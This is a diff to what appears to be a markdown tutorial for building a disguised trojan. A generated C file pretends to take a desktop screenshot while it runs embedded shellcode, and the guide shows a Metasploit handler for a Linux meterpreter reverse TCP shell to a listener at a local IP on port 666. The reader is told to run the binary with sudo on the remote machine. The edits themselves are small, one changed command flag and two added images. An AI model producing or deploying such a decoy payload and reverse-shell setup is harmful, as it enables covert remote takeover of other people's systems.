@@ -127,7 +127,7 @@ echo "{" >> payload.c
 echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
 echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
 echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
-echo "  system(\"sleep 1; xwud /tmp/ScreenShot.xwd\");" >> payload.c
+echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd\");" >> payload.c
 echo "  void (*ret)() = (void(*)())buf;" >> payload.c
 echo "  ret();" >> payload.c
 echo "}" >> payload.c
@@ -165,6 +165,8 @@ WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to
 sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
+![pic](http://i66.tinypic.com/kao6ps.png)
+
 <br />
 
 #### :: Execute the C Program (remote machine)
@@ -173,6 +175,8 @@ sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT
 chmod +x desktop_screenshot
 sudo ./desktop_screenshot
 ```
+
+![pic](http://i67.tinypic.com/5vrhq1.png)
 
 <br />
 
